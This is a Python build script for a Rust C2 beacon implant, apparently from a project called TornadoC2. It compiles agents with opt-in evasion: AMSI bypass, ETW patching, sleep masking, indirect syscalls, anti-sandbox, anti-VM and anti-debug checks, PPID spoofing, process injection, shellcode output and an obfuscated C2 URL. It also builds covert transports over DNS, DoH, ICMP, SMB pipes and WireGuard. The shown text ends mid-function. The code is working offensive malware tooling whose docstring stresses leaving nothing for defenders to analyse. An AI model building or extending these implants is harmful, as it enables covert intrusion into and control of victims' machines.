"""Cross-compilation of the Rust beacon agent.

Every behavioural property is set at build time via `TC2_*` environment
variables consumed by `agent/build.rs`, which emits them as `pub const`
items in `config_generated.rs`. There is no runtime configuration file,
no environment variable parsing, no on-disk artefact that a defender
can retrieve and analyse. The binary you build is the binary that runs.

Evasion features are opt-in flags on BeaconBuildConfig. Named OPSEC
profiles bundle common combinations.

Size-sensitive features are opt-in flags on BeaconBuildConfig and are
implemented as Cargo features rather than `TC2_*` env vars, because
they gate whether a dependency is compiled at all

SMB and TCP pivot builds additionally require an engagement-wide
ECDSA P-256 keypair, supplied as a PEM file containing both halves.
The builder picks the half the build needs based on its role:
the private half for a pivot listener, the public half for a pivot
client. Generate one with `beacon-build --pivot-key-gen`.
"""

from __future__ import annotations

import base64
import json
import os
import shutil
import subprocess
from dataclasses import dataclass
from typing import Dict, List, Optional

# ---------------------------------------------------------------------
# Configuration

@dataclass
class BeaconBuildConfig:
    # Connection
    url:           str = ''
    profile_name:  str = 'default'
    kill_days:     int = 30
    transport_mode:  str = 'http'
    transport_failover_after: int = 3
    dns_domain:      str = ''
    dns_resolver:    str = ''
    icmp_host:       str = ''
    doh_resolver:    str = ''
    doh_host_header: str = ''
    doh_user_agent:  str = ''
    pivot_key_path:  str = ''
    ws_url:          str = ''
    wireguard_server_pubkey: str = ''
    wireguard_server_addr:   str = ''
    wireguard_agent_privkey: str = ''
    wireguard_tunnel_ip:     str = ''
    wireguard_inner_port:    str = '8881'
    wireguard_server_tunnel_ip: str = '10.99.0.1'
    smb_pipe:        str = ''
    smb_relay_pipe:  str = ''
    tcp_bind_addr:   str = ''
    tcp_bind_token:  str = ''
    tcp_relay_target: str = ''
    tcp_relay_token:  str = ''
    tcp_rev_listen:  str = ''
    tcp_rev_target:  str = ''
    tcp_rev_token:   str = ''

    # Identity disambiguator, mixed into the server's session
    # fingerprint when non-empty. Empty (the default) produces
    # the pre-role fingerprint exactly, so no deployed agent's
    # session is invalidated by the field's existence.
    #
    # The builder defaults this to a transport-specific value
    # for the three pivot child transports:
    #
    #     smb      -> 'smb-child'
    #     tcp      -> 'tcp-bind'
    #     tcprev   -> 'tcp-rev'
    #
    # Every other build defaults to empty. An explicit value
    # always wins, so an operator can name two agents
    # 'primary' and 'backup' even when neither is a pivot.
    identity_role:   str = ''
    work_hours_start: str = '08:00'
    work_hours_end:   str = '19:00'
    tls_profile: str = 'rustls'
    target_os:     str = 'linux'
    target_arch:   str = 'amd64'
    output_format: str = 'exe'
    antisanbox:         bool = False
    amsi_bypass:        bool = False
    etw_patch:          bool = False
    sleep_mask:         str = 'none'
    syscall_method:     str = 'direct'
    string_obfuscation: bool = False
    garble:             bool = False
    upx:                bool = False
    ppid_spoof:         bool = False
    antidebug:          bool = False
    antivm:             bool = False
    verbose:            bool = False
    wasm_extensions:    bool = False
    agent_keypair_path: str = ''
    server_ecdh_pubkey_b64: str = ''
    stage_key_hex: str = ''
    stage_name:    str = ''
    inject: bool = False
    inject_method: str = 'default'
    injector_shellcode_b64: str = ''
    server_pubkey_path: str = ''
    client_cert_path:   str = ''
    client_key_path:    str = ''
    root_ca_path:       str = ''


DEFAULT_C2_PROFILE_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    'profiles', 'c2',
)


def load_c2_profile(name_or_path: str) -> Optional[dict]:
    """Load a C2 profile by name from profiles/c2/, or by explicit path.

    Returns a dict suitable for the `profile` argument of
    BeaconBuilder.build(), or None if the profile cannot be found.

    A C2 profile controls the HTTP fingerprint:
        user_agent, linux_user_agent,
        beacon_path, tasks_path, results_path,
        extra_headers, request_headers
    It does not control evasion — that is the OPSEC profile.
    """
    if not name_or_path:
        return None

    if os.path.isfile(name_or_path):
        path = name_or_path
    else:
        stem = name_or_path[:-5] if name_or_path.endswith('.json') \
               else name_or_path
        path = os.path.join(DEFAULT_C2_PROFILE_DIR, stem + '.json')

    if not os.path.exists(path):
        return None

    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return None


def list_c2_profiles() -> List[str]:
    """Return sorted profile names from the default directory."""
    if not os.path.isdir(DEFAULT_C2_PROFILE_DIR):
        return []
    return sorted(
        e[:-5] for e in os.listdir(DEFAULT_C2_PROFILE_DIR)
        if e.endswith('.json') and not e.startswith('.')
    )

OPSEC_PROFILES = {
    'default': BeaconBuildConfig(),

    'stealth': BeaconBuildConfig(
        sleep_mask='none',
        string_obfuscation=True,
    ),

    'opsec': BeaconBuildConfig(
        antisanbox=True,
        amsi_bypass=True,
        etw_patch=True,
        sleep_mask='aes-ctr',
        syscall_method='indirect',
        string_obfuscation=True,
        garble=True,
        ppid_spoof=True,
        antidebug=True,
        antivm=True,
        tls_profile='chrome',
    ),

    'paranoid': BeaconBuildConfig(
        antisanbox=True,
        amsi_bypass=True,
        etw_patch=True,
        # cronos is the fiber-based sleep mask: full .text
        # encryption, no kernel timer callbacks, no new threads.
        # Windows amd64 only. A paranoid build for Linux must
        # override this with --sleep-mask aes-ctr; the builder
        # refuses cronos on a non-Windows target rather than
        # silently substituting a weaker mask.
        sleep_mask='cronos',
        syscall_method='indirect',
        string_obfuscation=True,
        garble=True,
        ppid_spoof=False,
        antidebug=True,
        antivm=True,
        upx=True,
        tls_profile='chrome',
    ),
}


# ---------------------------------------------------------------------
# Pivot keypair helpers

def _read_pivot_pem(path: str) -> tuple:
    """Read a pivot PEM file and return (priv_b64, pub_b64).

    Both values are standard base64 of the raw DER bytes, which is
    exactly the encoding the agent's TC2_PIVOT_PRIV_KEY_B64 and
    TC2_PIVOT_PUB_KEY_B64 expect. A PEM body is already standard
    base64 of the DER, so the extraction is a line-join, not a
    decode-reencode.

    Either half may be absent from the file. A parent-only
    deployment that ships the private half to operators and keeps
    the public half on the server, for instance, produces
    (priv_b64, '').

    Raises RuntimeError on a missing file, an unreadable file, or a
    malformed PEM block.
    """
    if not path:
        return ('', '')
    try:
        with open(path, 'r', encoding='utf-8') as fh:
            body = fh.read()
    except OSError as exc:
        raise RuntimeError(
            f'cannot read pivot key file {path!r}: {exc}')

    import re as _re

    def _extract(label: str) -> str:
        pattern = (
            r'-----BEGIN ' + label + r'-----\s*'
            r'([A-Za-z0-9+/=\s]+?)'
            r'\s*-----END ' + label + r'-----'
        )
        m = _re.search(pattern, body, _re.DOTALL)
        if not m:
            return ''
        return _re.sub(r'\s+', '', m.group(1))

    priv = _extract('PRIVATE KEY')
    if not priv:
        priv = _extract('EC PRIVATE KEY')
    pub = _extract('PUBLIC KEY')

    if not priv and not pub:
        raise RuntimeError(
            f'pivot key file {path!r} contains no PRIVATE KEY or '
            f'PUBLIC KEY PEM block. Regenerate it with '
            f'`--pivot-key-gen`.')

    return (priv, pub)


def generate_pivot_keypair(out_path: str) -> tuple:
    """Generate a fresh pivot keypair and write it as PEM.

    Returns (priv_b64, pub_b64) — the same values
    _read_pivot_pem would return if you read the file back.

    Requires the `cryptography` package; raises RuntimeError with a
    clear install hint if it is missing. The builder already uses
    cryptography for the agent's result-signing keypair, so a
    working deployment has it.
    """
    try:
        from cryptography.hazmat.primitives.asymmetric import ec
        from cryptography.hazmat.primitives import serialization
    except ImportError as exc:
        raise RuntimeError(
            'pivot keypair generation requires the `cryptography` '
            'package. Install with:\n'
            '    pip install cryptography') from exc

    import base64 as _b64
    import os as _os

    priv = ec.generate_private_key(ec.SECP256R1())

    priv_der = priv.private_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pub_der = priv.public_key().public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    priv_pem = priv.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode('ascii')
    pub_pem = priv.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode('ascii')

    _os.makedirs(_os.path.dirname(out_path) or '.', exist_ok=True)
    tmp = out_path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as fh:
        fh.write(priv_pem)
        fh.write(pub_pem)
    try:
        _os.chmod(tmp, 0o600)
    except OSError:
        pass
    _os.replace(tmp, out_path)

    return (
        _b64.b64encode(priv_der).decode('ascii'),
        _b64.b64encode(pub_der).decode('ascii'),
    )


# ---------------------------------------------------------------------
# Identity role defaulting

def _default_identity_role(cfg: 'BeaconBuildConfig') -> str:
    """Return the identity role the build should carry.

    An explicit `identity_role` always wins. Otherwise, the three
    pivot child transports get a default that disambiguates them
    from their parent on the same host. Every other build gets an
    empty role, which reproduces the pre-role fingerprint exactly.

    The role travels in its own field on the wire and is mixed into
    the server's fingerprint hash. It is deliberately not a
    hostname suffix: the beacon list should show the machine's real
    hostname, and the role is a fingerprint input rather than a
    display name.

    The three defaults match the transport names in
    `transport_mode`. A future transport that also runs same-host
    beside a parent should extend this switch and the server's
    `_fingerprint` together.
    """
    explicit = (getattr(cfg, 'identity_role', '') or '').strip()
    if explicit:
        return explicit
    mode = (getattr(cfg, 'transport_mode', '') or '').strip().lower()
    if mode == 'smb':
        return 'smb-child'
    if mode == 'tcp':
        return 'tcp-bind'
    if mode == 'tcprev':
        return 'tcp-rev'
    return ''


# ---------------------------------------------------------------------
# Builder

class BeaconBuilder:
    """Compiles the Go beacon with a specific configuration."""

    def __init__(self, source_dir: str, output_dir: str,
                 agent_dir: str = None):
        self.source_dir = os.path.abspath(source_dir)
        self.output_dir = os.path.abspath(output_dir)
        self.repo_root = os.path.dirname(os.path.dirname(
            self.source_dir))
        if agent_dir:
            self.agent_dir = os.path.abspath(agent_dir)
        else:
            self.agent_dir = self._find_agent_dir()
        self._assert_toolchain()

    def _find_agent_dir(self) -> str:
        """Locate the Rust crate directory by searching for Cargo.toml.

        Candidates, in order:

          1. <pkg>/agent              — agent sibling of beacon/
          2. <repo>/agent             — agent at the repo root
          3. <repo>/tornadoc2/agent   — agent inside a nested package

        The first candidate whose directory contains Cargo.toml wins. If
        none match, the primary candidate is returned so the error
        from _assert_toolchain names a specific path.
        """
        pkg_dir  = os.path.dirname(os.path.abspath(self.source_dir))
        candidates = [
            os.path.join(pkg_dir, 'agent'),
            os.path.join(self.repo_root, 'agent'),
            os.path.join(self.repo_root, 'tornadoc2', 'agent'),
        ]
        for candidate in candidates:
            if os.path.isfile(os.path.join(candidate, 'Cargo.toml')):
                return candidate
        return candidates[0]

    def build(self, config: BeaconBuildConfig,
              profile: Optional[dict] = None) -> str:
        """Compile the beacon. Returns the output path."""

        os.makedirs(self.output_dir, exist_ok=True)

        if getattr(config, 'wasm_extensions', False) and \
                config.output_format == 'stager':
            raise RuntimeError(
                "wasm_extensions=True is not supported on a stager "
                "build. The stager is a minimal first stage with no "
                "extension host. Leave wasm_extensions=False for the "
                "stager, and enable it on the full agent it fetches.")

        if getattr(config, 'inject', False):
            if config.target_os == 'windows':
                if config.output_format not in ('exe', 'shellcode'):
                    raise RuntimeError(
                        f"inject=True requires output_format 'exe' "
                        f"or 'shellcode' on Windows; got "
                        f"{config.output_format!r}. A DLL or a "
                        f"stager cannot inject itself.")
            elif config.target_os == 'linux':
                if config.output_format != 'elf':
                    raise RuntimeError(
                        f"inject=True requires output_format 'elf' "
                        f"on Linux; got {config.output_format!r}.")
            else:
                raise RuntimeError(
                    f"inject=True is not implemented for "
                    f"target_os={config.target_os!r}. The runtime "
                    f"injection paths are Linux (ptrace) and "
                    f"Windows (CreateRemoteThread) only.")

        if not config.agent_keypair_path:
            print("[build] warning: agent_keypair_path is empty — a new "
                  "signing keypair will be generated. Redeploying over "
                  "an existing session will be rejected as an "
                  "impersonation attempt. Set agent_keypair_path to a "
                  "stable file to make rebuilds idempotent.")
        if getattr(config, 'wasm_extensions', False):
            print("[build] note: wasm_extensions=True — the WASM "
                  "extension host and its interpreter are compiled "
                  "into this binary. Expect ~1 MB additional size "
                  "with wasmi, or 3–7 MB with wasmtime. Leave "
                  "wasm_extensions=False (the default) for a build "
                  "with no runtime-loadable extensions. The extension "
                  "verbs will be absent from the target's catalogue "
                  "either way, unless wasm_extensions is True.")
        out = os.path.join(self.output_dir, self._output_name(config))

        env = self._build_env(config)
        env.update(self._build_env_vars(config, profile))

        cmd = self._build_command(config)
        subprocess.run(cmd, env=env, cwd=self.agent_dir, check=True)
        self._copy_artifact(config, out)

        self._last_build_injected = False
        if getattr(config, 'inject', False):
            before = os.path.getsize(out)
            out = self._rebuild_with_injector(config, profile, env, out)
            after = os.path.getsize(out)
            self._last_build_injected = after > before

        if config.upx and shutil.which('upx'):
            upx = subprocess.run(
                ['upx', '--best', '--quiet', out],
                capture_output=True)
            if upx.returncode != 0:
                err = (upx.stderr or upx.stdout or b'').decode(
                    'utf-8', 'replace').strip()
                print(f'[build] warning: UPX failed '
                      f'(exit {upx.returncode}): '
                      f'{err or "unknown error"}. The built binary '
                      f'is the unpacked pass-1 output. Rebuild with '
                      f'upx=False to silence this warning, or '
                      f'upgrade UPX if the target format is '
                      f'unsupported by the current version.')

        if config.output_format == 'shellcode':
            out = self._convert_to_shellcode(config, out)

        return out

    # ------------------------------------------------------------------

    def _assert_toolchain(self) -> None:
        if shutil.which('cargo') is None or shutil.which('rustc') is None:
            raise RuntimeError(
                'cargo/rustc toolchain not found on PATH. '
                'Install rustup: https://rustup.rs')
        cargotoml = os.path.join(self.agent_dir, 'Cargo.toml')
        if not os.path.isfile(cargotoml):
            pkg_dir = os.path.dirname(os.path.abspath(self.source_dir))
            raise RuntimeError(
                f'Cargo.toml not found. Checked:\n'
                f'  {os.path.join(pkg_dir, "agent")}\n'
                f'  {os.path.join(self.repo_root, "agent")}\n'
                f'  {os.path.join(self.repo_root, "tornadoc2", "agent")}\n'
                f'Place Cargo.toml in one of these directories, or pass '
                f'agent_dir=<path> to BeaconBuilder().'
            )

    def _build_env(self, cfg: BeaconBuildConfig) -> dict:
        """Base build environment for cargo/rustc itself.

        The TC2_* configuration vars are merged in by build() after this
        returns. This function only handles what cargo and rustc need.
        """
        env = os.environ.copy()

        rustflags = env.get('RUSTFLAGS', '').strip()
        if rustflags:
            rustflags += ' '
        rustflags += f'--remap-path-prefix={self.agent_dir}=.'
        env['RUSTFLAGS'] = rustflags

        env['CARGO_TARGET_DIR'] = os.path.join(self.agent_dir, 'target')

        for var in ('GOOS', 'GOARCH', 'GOAMD64', 'GOARM64', 'GOARM',
                    'GOMIPS', 'GOMIPS64', 'GOPPC64', 'GO386', 'GOWASM',
                    'GOEXPERIMENT', 'GOFLAGS', 'CGO_ENABLED'):
            env.pop(var, None)

        return env

    def _build_command(self, cfg: BeaconBuildConfig) -> List[str]:
        """Build the cargo invocation for this configuration.

        cargo writes the artifact to
        <CARGO_TARGET_DIR>/<triple>/release/<bin>. The caller copies
        that to the user-visible output path via _copy_artifact().

        Two Cargo features are the mechanism for the build-time size
        trades this builder exposes. Both are opt-in, because both
        pull in dependencies that a lean build can skip entirely:

          * `dll`         — set when output_format == 'dll'.
                             `Cargo.toml` ships
                             crate-type = ["rlib", "cdylib"]
                             unconditionally, so this feature gates
                             only the DllMain export in lib.rs.
                             Without it, the DLL target compiles but
                             has no entry point. (This was a bug in
                             the previous version of this method:
                             the `--features dll` flag was never
                             appended, so DLL builds produced a
                             cdylib with no exported DllMain.)

          * `wasm-host`   — set when wasm_extensions is True.
                             Pulls in the WASM extension host and
                             the wasmi interpreter. Off by default
                             because the interpreter is the single
                             largest optional dependency. An agent
                             without this feature has no `extension`
                             verbs and no interpreter, and its
                             binary does not link wasmi at all.
        """
        if cfg.output_format == 'dll':
            if cfg.target_os != 'windows':
                raise RuntimeError(
                    "output_format='dll' requires target_os='windows'")

        bin_name = 'stager' if cfg.output_format == 'stager' else 'beacon'
        features: List[str] = []
        if cfg.output_format == 'dll':
            features.append('dll')
        if getattr(cfg, 'wasm_extensions', False):
            features.append('wasm-host')

        cmd = [
            'cargo', 'build',
            '--release',
            '--target', self._rust_triple(cfg),
            '--bin', bin_name,
        ]
        if features:
            cmd.extend(['--features', ','.join(features)])
        return cmd

    def _rust_triple(self, cfg: BeaconBuildConfig) -> str:
        """Map (target_os, target_arch) to a Rust target triple."""
        triple = {
            ('linux',   'amd64'): 'x86_64-unknown-linux-gnu',
            ('linux',   'arm64'): 'aarch64-unknown-linux-gnu',
            ('windows', 'amd64'): 'x86_64-pc-windows-gnu',
            ('windows', '386'):   'i686-pc-windows-gnu',
            ('windows', 'arm64'): 'aarch64-pc-windows-msvc',
        }.get((cfg.target_os, cfg.target_arch))
        if triple is None:
            raise RuntimeError(
                f'unsupported target {cfg.target_os}/{cfg.target_arch}; '
                f'valid combinations: '
                f'linux/amd64, linux/arm64, windows/amd64, '
                f'windows/386, windows/arm64')
        return triple

    def _target_dir(self, cfg: BeaconBuildConfig) -> str:
        """Return agent/target/<triple> — where cargo writes the binary."""
        return os.path.join(
            self.agent_dir, 'target', self._rust_triple(cfg))

    def _copy_artifact(self, cfg: BeaconBuildConfig, out: str) -> None:
        """Copy the cargo-produced binary to the user-visible path."""
        bin_name = 'stager' if cfg.output_format == 'stager' else 'beacon'
        suffix = '.exe' if cfg.target_os == 'windows' else ''
        src = os.path.join(
            self._target_dir(cfg), 'release', bin_name + suffix)
        if not os.path.exists(src):
            raise RuntimeError(
                f'cargo did not produce {src}. Check the cargo '
                f'build output above for the actual error.')
        shutil.copy2(src, out)

    def _build_env_vars(self, cfg: BeaconBuildConfig,
                        profile: Optional[dict]) -> Dict[str, str]:
        import base64 as _b64

        if cfg.output_format == 'stager':
            return self._build_stager_env_vars(cfg, profile)

        def _read_pem(path: str) -> str:
            if not path:
                return ''
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    return f.read()
            except OSError:
                return ''

        server_pubkey_pem = _read_pem(cfg.server_pubkey_path)
        client_cert_pem   = _read_pem(cfg.client_cert_path)
        client_key_pem    = _read_pem(cfg.client_key_path)
        root_ca_pem       = _read_pem(cfg.root_ca_path)

        import secrets as _secrets
        obf_key = _secrets.token_bytes(16)

        def _obf(s: str) -> str:
            raw = s.encode('utf-8')
            xored = bytes(b ^ obf_key[i % len(obf_key)]
                          for i, b in enumerate(raw))
            return _b64.b64encode(xored).decode('ascii')

        env: Dict[str, str] = {
            'TC2_OBF_KEY_HEX':      obf_key.hex(),
            'TC2_DEFAULT_URL':      _obf(cfg.url),
            'TC2_DEFAULT_PROFILE':  cfg.profile_name,
            'TC2_KILL_DAYS':        str(cfg.kill_days),
            'TC2_WORK_HOURS_START': cfg.work_hours_start,
            'TC2_WORK_HOURS_END':   cfg.work_hours_end,
            'TC2_TLS_PROFILE':      cfg.tls_profile,
            'TC2_VERBOSE':          'true' if getattr(cfg, 'verbose', False) else 'false',
        }

        if profile is not None:
            merged = dict(profile)
            for key in ('beacon_path', 'tasks_path',
                        'results_path', 'request_headers'):
                if key in merged:
                    continue
                c2 = merged.get('c2') or {}
                if key in c2:
                    merged[key] = c2[key]

            if 'shaping' in merged:
                from .shaping import validate as _validate_shaping
                errors, warnings = _validate_shaping(merged['shaping'])
                for w in warnings:
                    print(f"[build] shaping warning: {w}")
                if errors:
                    raise RuntimeError(
                        'C2 profile shaping block is invalid:\n  ' +
                        '\n  '.join(errors) +
                        '\nFix the profile or remove the shaping '
                        'block before building.')

            env['TC2_PROFILE_JSON'] = _obf(json.dumps(merged))
        if server_pubkey_pem:
            encoded = _b64.b64encode(
                server_pubkey_pem.encode('utf-8')
            ).decode('ascii')
            env['TC2_SERVER_PUBKEY_PEM'] = encoded
        if client_cert_pem:
            encoded = _b64.b64encode(
                client_cert_pem.encode('utf-8')
            ).decode('ascii')
            env['TC2_CLIENT_CERT_PEM'] = encoded
        if client_key_pem:
            encoded = _b64.b64encode(
                client_key_pem.encode('utf-8')
            ).decode('ascii')
            env['TC2_CLIENT_KEY_PEM'] = encoded
        if root_ca_pem:
            encoded = _b64.b64encode(
                root_ca_pem.encode('utf-8')
            ).decode('ascii')
            env['TC2_ROOT_CA_PEM'] = encoded
        for env_key, value in (
            ('TC2_ANTISANDBOX',        cfg.antisanbox),
            ('TC2_AMSI_BYPASS',        cfg.amsi_bypass),
            ('TC2_ETW_PATCH',          cfg.etw_patch),
            ('TC2_SLEEP_MASK_ENABLED', cfg.sleep_mask not in ('', 'none')),
            ('TC2_STRING_OBFUSCATION', cfg.string_obfuscation),
            ('TC2_PPID_SPOOF',         cfg.ppid_spoof),
            ('TC2_ANTIDEBUG',          cfg.antidebug),
            ('TC2_ANTIVM',             cfg.antivm),
        ):
            env[env_key] = 'true' if value else 'false'

        env['TC2_SLEEP_MASK_TYPE'] = cfg.sleep_mask

        env['TC2_SYSCALL_METHOD'] = cfg.syscall_method

        modes = [
            m.strip().lower()
            for m in (cfg.transport_mode or 'http').split(',')
            if m.strip()
        ]
        if not modes:
            raise RuntimeError('transport_mode is empty')
        for m in modes:
            if m not in ('http', 'dns', 'doh', 'icmp',
                         'smb', 'tcp', 'tcprev', 'quic',
                         'websocket', 'wireguard'):
                raise RuntimeError(
                    f"unknown transport: {m!r} — valid values "
                    f"are 'http', 'dns', 'doh', 'icmp', 'smb', "
                    f"'tcp', 'tcprev', 'quic', 'websocket', "
                    f"'wireguard', or a comma-separated list")

        # Identity role. Defaulted to a transport-specific value
        # for the three pivot child transports; empty for every
        # other build. Emitted only when non-empty so an agent
        # built without a role produces the same fingerprint it
        # always did, and no deployed session is invalidated by
        # this flag's existence.
        identity_role = _default_identity_role(cfg)
        if identity_role:
            env['TC2_IDENTITY_ROLE'] = identity_role

        _VALID_SLEEP_MASKS = ('', 'none', 'rc4', 'aes-ctr',
                              'cronos', 'hwbp')
        if cfg.sleep_mask not in _VALID_SLEEP_MASKS:
            raise RuntimeError(
                f"sleep_mask must be one of 'none', 'rc4', "
                f"'aes-ctr', 'cronos', 'hwbp'; "
                f"got {cfg.sleep_mask!r}. "
                f"'ekko' is not implemented — use 'cronos' or "
                f"'hwbp'.")
        if cfg.sleep_mask in ('cronos', 'hwbp'):
            if cfg.target_os != 'windows':
                raise RuntimeError(
                    f"sleep_mask {cfg.sleep_mask!r} is Windows-only; "
                    f"got target_os={cfg.target_os!r}. Use "
                    f"'aes-ctr' or 'rc4' for a non-Windows build, "
                    f"or 'none' to skip the mask entirely.")
            if cfg.target_arch != 'amd64':
                raise RuntimeError(
                    f"sleep_mask {cfg.sleep_mask!r} requires "
                    f"target_arch='amd64'; got "
                    f"target_arch={cfg.target_arch!r}. The assembly "
                    f"stubs are amd64-only.")
        if cfg.syscall_method not in ('direct', 'indirect'):
            raise RuntimeError(
                f"syscall_method must be 'direct' or 'indirect'; "
                f"got {cfg.syscall_method!r}")
        if cfg.syscall_method == 'indirect' and cfg.target_os != 'windows':
            raise RuntimeError(
                f"syscall_method='indirect' is Windows-only; "
                f"got target_os={cfg.target_os!r}. Use "
                f"'direct' or leave the field at its default.")
        if cfg.tls_profile not in ('go', 'rustls', 'chrome',
                                   'firefox', 'safari'):
            raise RuntimeError(
                f"tls_profile must be one of 'rustls', 'chrome', "
                f"'firefox', 'safari' ('go' is accepted as a "
                f"deprecated alias for 'rustls'); got "
                f"{cfg.tls_profile!r}")

        if ('http' in modes or 'quic' in modes) and not cfg.url:
            raise RuntimeError(
                f"transport_mode includes "
                f"{'http' if 'http' in modes else 'quic'} but "
                f"url is empty")

        if 'smb' in modes:
            if len(modes) != 1:
                raise RuntimeError(
                    "transport_mode 'smb' cannot be combined with "
                    "other transports; the SMB child has no "
                    "fallback")
            if not getattr(cfg, 'smb_pipe', ''):
                raise RuntimeError(
                    "transport_mode='smb' requires smb_pipe to be "
                    "set to the parent's pipe path. Same-host: a "
                    "bare pipe name such as 'tornado_relay_001'. "
                    "Cross-host: the parent's UNC path such as "
                    r"'\\WIN-SRV2\pipe\tornado_relay_001'.")
        if 'tcp' in modes:
            if len(modes) != 1:
                raise RuntimeError(
                    "transport_mode 'tcp' cannot be combined with "
                    "other transports")
            if not getattr(cfg, 'tcp_bind_addr', ''):
                raise RuntimeError(
                    "transport_mode='tcp' requires tcp_bind_addr")
            if not getattr(cfg, 'tcp_bind_token', ''):
                raise RuntimeError(
                    "transport_mode='tcp' requires tcp_bind_token")
            if len(cfg.tcp_bind_token) != 64:
                raise RuntimeError(
                    "tcp_bind_token must be 64 hex characters "
                    "(32 bytes)")
            try:
                bytes.fromhex(cfg.tcp_bind_token)
            except ValueError:
                raise RuntimeError(
                    "tcp_bind_token must be valid hex")

        if 'tcprev' in modes:
            if len(modes) != 1:
                raise RuntimeError(
                    "transport_mode 'tcprev' cannot be combined "
                    "with other transports")
            if not getattr(cfg, 'tcp_rev_target', ''):
                raise RuntimeError(
                    "transport_mode='tcprev' requires "
                    "tcp_rev_target (the parent's listening "
                    "host:port, as reachable from the child)")
            if not getattr(cfg, 'tcp_rev_token', ''):
                raise RuntimeError(
                    "transport_mode='tcprev' requires "
                    "tcp_rev_token")
            if len(cfg.tcp_rev_token) != 64:
                raise RuntimeError(
                    "tcp_rev_token must be 64 hex characters "
                    "(32 bytes)")
            try:
                bytes.fromhex(cfg.tcp_rev_token)
            except ValueError:
                raise RuntimeError(
                    "tcp_rev_token must be valid hex")

        if 'websocket' in modes:
            if len(modes) != 1:
                raise RuntimeError(
                    "transport_mode 'websocket' cannot be combined "
                    "with other transports in this version.")
            if (cfg.target_os == 'windows'
                    and cfg.output_format == 'dll'):
                raise RuntimeError(
                    "transport_mode 'websocket' is not supported "
                    "for output_format='dll' — the DLL has no "
                    "entry point to run the WebSocket loop.")
            if not cfg.url:
                raise RuntimeError(
                    "transport_mode 'websocket' requires url "
                    "(https://host:port; the client converts the "
                    "scheme to wss:// automatically)")

        if 'wireguard' in modes:
            if len(modes) != 1:
                raise RuntimeError(
                    "transport_mode 'wireguard' cannot be combined "
                    "with other transports in this version.")
            if not getattr(cfg, 'wireguard_server_pubkey', ''):
                raise RuntimeError(
                    "transport_mode 'wireguard' requires "
                    "wireguard_server_pubkey (the server's "
                    "public key, base64)")
            if not getattr(cfg, 'wireguard_server_addr', ''):
                raise RuntimeError(
                    "transport_mode 'wireguard' requires "
                    "wireguard_server_addr (host:port of the "
                    "server's UDP listener)")
            if not getattr(cfg, 'wireguard_agent_privkey', ''):
                raise RuntimeError(
                    "transport_mode 'wireguard' requires "
                    "wireguard_agent_privkey (the agent's private "
                    "key, base64)")
            if not getattr(cfg, 'wireguard_tunnel_ip', ''):
                raise RuntimeError(
                    "transport_mode 'wireguard' requires "
                    "wireguard_tunnel_ip (e.g. 10.99.0.2)")

        env['TC2_TRANSPORT_MODE'] = ','.join(modes)

        if 'websocket' in modes:
            env['TC2_WEBSOCKET_URL'] = _obf(cfg.url)

        if 'wireguard' in modes:
            env['TC2_WIREGUARD_SERVER_PUBKEY'] = cfg.wireguard_server_pubkey
            env['TC2_WIREGUARD_SERVER_ADDR'] = cfg.wireguard_server_addr
            env['TC2_WIREGUARD_AGENT_PRIVKEY'] = cfg.wireguard_agent_privkey
            env['TC2_WIREGUARD_TUNNEL_IP'] = cfg.wireguard_tunnel_ip

            inner_port = (getattr(cfg, 'wireguard_inner_port', '')
                          or '8881')
            env['TC2_WIREGUARD_INNER_PORT'] = inner_port
                
            server_tunnel_ip = (getattr(
                cfg, 'wireguard_server_tunnel_ip', '')
                or '10.99.0.1')
            env['TC2_WIREGUARD_SERVER_TUNNEL_IP'] = server_tunnel_ip

        if getattr(cfg, 'smb_pipe', ''):
            if cfg.target_os != 'windows':
                raise RuntimeError(
                    "smb_pipe requires target_os=windows")
            env['TC2_SMB_PIPE'] = cfg.smb_pipe

        if getattr(cfg, 'tcp_bind_addr', ''):
            env['TC2_TCP_BIND_ADDR'] = cfg.tcp_bind_addr
            env['TC2_TCP_BIND_TOKEN'] = cfg.tcp_bind_token

        if getattr(cfg, 'tcp_rev_listen', ''):
            if not getattr(cfg, 'tcp_rev_token', ''):
                raise RuntimeError(
                    "tcp_rev_listen requires tcp_rev_token")
            if len(cfg.tcp_rev_token) != 64:
                raise RuntimeError(
                    "tcp_rev_token must be 64 hex characters "
                    "(32 bytes)")
            try:
                bytes.fromhex(cfg.tcp_rev_token)
            except ValueError:
                raise RuntimeError(
                    "tcp_rev_token must be valid hex")
            env['TC2_TCP_REV_LISTEN'] = cfg.tcp_rev_listen
            env['TC2_TCP_REV_TOKEN'] = cfg.tcp_rev_token

        if getattr(cfg, 'tcp_rev_target', ''):
            if not getattr(cfg, 'tcp_rev_token', ''):
                raise RuntimeError(
                    "tcp_rev_target requires tcp_rev_token")
            if len(cfg.tcp_rev_token) != 64:
                raise RuntimeError(
                    "tcp_rev_token must be 64 hex characters "
                    "(32 bytes)")
            try:
                bytes.fromhex(cfg.tcp_rev_token)
            except ValueError:
                raise RuntimeError(
                    "tcp_rev_token must be valid hex")
            env['TC2_TCP_REV_TARGET'] = cfg.tcp_rev_target
            env['TC2_TCP_REV_TOKEN'] = cfg.tcp_rev_token

        if getattr(cfg, 'smb_relay_pipe', ''):  
            if cfg.target_os != 'windows':
                raise RuntimeError(
                    "smb_relay_pipe requires target_os=windows")
            import re as _re
            if not _re.fullmatch(
                    r'[A-Za-z0-9._-]+', cfg.smb_relay_pipe):
                raise RuntimeError(
                    f"smb_relay_pipe must match "
                    f"[A-Za-z0-9._-]+; got "
                    f"{cfg.smb_relay_pipe!r}. A bare pipe name "
                    f"only — no path prefix, no UNC form.")
            env['TC2_SMB_RELAY_PIPE'] = cfg.smb_relay_pipe

        if getattr(cfg, 'tcp_relay_target', ''):
            if not getattr(cfg, 'tcp_relay_token', ''):
                raise RuntimeError(
                    "tcp_relay_target requires tcp_relay_token")
